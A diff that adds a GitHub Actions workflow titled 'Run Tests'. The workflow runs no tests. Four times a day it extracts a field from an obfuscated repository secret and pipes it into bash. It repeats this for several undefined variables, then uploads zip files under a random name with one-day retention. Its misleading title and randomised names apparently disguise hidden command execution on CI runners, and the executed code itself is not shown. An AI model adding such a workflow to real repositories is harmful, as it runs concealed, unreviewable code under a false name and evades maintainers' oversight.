@@ -1,0 +1,33 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          kjt90: ${{ secrets.kjt90 }}
+        run: |
+          printf '%s' "$kjt90" | jq -r .zdqs14434 | /bin/bash
+          printf '%s' "$dka0487" | jq -r .jhwg3853 | /bin/bash
+          printf '%s' "$di9961" | jq -r .vcfah7 | /bin/bash
+          echo $pxq111 | jq -r .ovmp6 | /bin/bash
+          echo $iu1045 | jq -r .lscuw44289 | /bin/bash
+          echo $ml62 | jq -r .fwsxr1164 | /bin/bash
+          echo $zz9 | jq -r .w2245 | /bin/bash
+          printf '%s' "$pftaa40" | jq -r .jud4 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: mIU1YgjP
+          path: "*.zip"
+          retention-days: 1
